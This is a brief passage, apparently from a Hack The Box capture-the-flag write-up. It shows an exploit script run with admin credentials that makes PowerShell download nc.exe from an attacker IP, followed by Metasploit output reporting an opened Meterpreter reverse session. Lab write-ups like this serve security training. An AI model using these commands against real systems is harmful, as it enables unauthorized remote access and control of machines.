...
```text
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a '-NoProfile -Command wget 10.10.15.82:8090/nc.exe -OutFile C:\\Windows\\Temp\\n.exe'
```
...
[*] Sending stage (176195 bytes) to <YOUR_IP>
[*] Meterpreter session 1 opened (10.10.15.82:4444 -> <YOUR_IP>:49711) at 2020-07-05 23:15:59 -0400
